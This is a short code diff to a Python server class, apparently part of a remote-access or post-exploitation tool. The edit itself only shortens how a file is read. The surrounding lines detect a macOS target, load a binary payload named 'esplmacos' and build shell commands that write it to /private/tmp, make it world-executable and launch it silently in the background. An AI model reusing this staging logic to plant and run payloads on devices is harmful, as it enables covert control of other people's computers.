@@ -111,9 +111,7 @@ class Server:
         if device_arch.decode() in self.macos_architectures:
             self.verbose_print(
                 "Detected macOS (" + str(device_arch.decode()) + ")")
-            f = open("resources/esplmacos", "rb")
-            payload = f.read()
-            f.close()
+            payload = open("resources/esplmacos", "rb").read()
             instructions = ("cat >/private/tmp/tmpespl;" + "chmod 777 /private/tmp/tmpespl;" +
                             "mv /private/tmp/tmpespl /private/tmp/espl;" + "/private/tmp/espl " + payload_parameter.decode() + " 2>/dev/null &\n")
             return (instructions, payload)
